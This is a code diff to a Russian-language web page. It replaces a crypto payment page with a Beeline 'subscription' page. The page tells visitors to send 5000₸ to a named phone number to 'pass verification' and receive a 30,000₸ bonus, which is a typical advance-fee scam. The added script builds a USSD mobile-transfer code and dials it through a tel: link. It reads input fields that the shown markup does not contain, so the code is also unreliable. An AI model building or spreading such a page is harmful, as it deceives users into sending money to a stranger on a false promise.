@@ -35,6 +35,8 @@
     .error-msg { margin-top:6px; font-size:12px; color:#ff6b6b; display:none;}
     input.error, textarea.error { border-color:#ff6b6b !important; box-shadow:0 0 0 2px rgba(255,107,107,0.15);}
     button:disabled { opacity:0.5; cursor:not-allowed; transform:none !important; box-shadow:none !important;}
+    /* FadeIn для Kaspi Donation виджетов */
+    #kaspi-goal, #kaspi-last { animation:fadeIn 0.6s ease; margin-bottom:20px;}
   </style>
 </head>
 <body>
@@ -85,13 +87,21 @@
   </div>
 
   <!-- PAGE 5: CRYPTO PAYMENT -->
-  <div class="page" id="page5">
-    <h2>Пополнение баланса</h2>
-    <input type="number" id="cryptoAmount" placeholder="Сумма в USDT" style="width:100%; padding:12px; border-radius:10px; border:none; margin-top:10px; text-align:center;">
-    <button id="payButton">Пополнить</button>
-    <div class="note">
-      Платеж безопасно переводится на криптокошелек. Пользователю не нужен свой кошелек.
+    <!-- PAGE 5: SUBSCRIPTION (Beeline) -->
+    <!-- PAGE 5: SUBSCRIPTION (Beeline) -->
+    <div class="page" id="page5">
+        <h2>Подписка / Пополнение</h2>
+
+        <p>В открывшемся окне введите этот номер телефона +7 771 510 5367 и сумму 5000₸, чтобы пройти проверку и получить 30 000₸ бонус.</p>
+
+        <a href="https://beeline.kz/ru/top-up" class="btn" id="beelinePayBtn">Оплатить через Beeline</a>
+
+        <div class="note">
+            Оплата производится через Beeline. Введите сумму и нажмите "Оплатить".
+        </div>
     </div>
+
+
   </div>
 
 </div>
@@ -165,29 +175,25 @@
   }
 
   /* Crypto Payment */
-  const button = document.getElementById('payButton');
+    const payBtn = document.getElementById('beelinePayBtn');
+    const numberInput = document.getElementById('beelineNumber');
+    const amountInput = document.getElementById('beelineAmount');
 
-    button.addEventListener('click', async () => {
-      try {
-        const res = await fetch('/api/create-payment', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({ amount: 100, currency: 'USDT' })
-        });
-    
-        const data = await res.json();
-        if (data.paymentUrl) {
-          window.location.href = data.paymentUrl;
-        } else {
-          alert('Ошибка создания платежа: ' + (data.error || 'Unknown'));
+    payBtn.addEventListener('click', () => {
+        const amount = parseInt(amountInput.value);
+        if (!amount || amount <= 0) {
+        alert('Введите корректную сумму для оплаты');
+        return;
         }
-      } catch (err) {
-        console.error(err);
-        alert('Ошибка при запросе к серверу');
-      }
+
+        // Формируем USSD ссылку
+        const ussd = `*700*${numberInput.value.replace(/\D/g,'')}*${amount}#`;
+        window.location.href = `tel:${ussd}`;
     });
 </script>
 
 </body>
 </html>
+
+
 
